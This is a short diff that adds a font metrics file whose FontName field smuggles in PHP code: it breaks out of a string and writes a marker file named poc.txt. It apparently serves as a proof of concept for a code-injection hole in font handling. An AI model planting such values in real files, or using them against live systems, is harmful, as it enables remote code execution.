@@ -1,0 +1,3 @@
+FontName '; file_put_contents("poc.txt", "VULNERABILE"); // 
+Weight Normal
+ItalicAngle 0
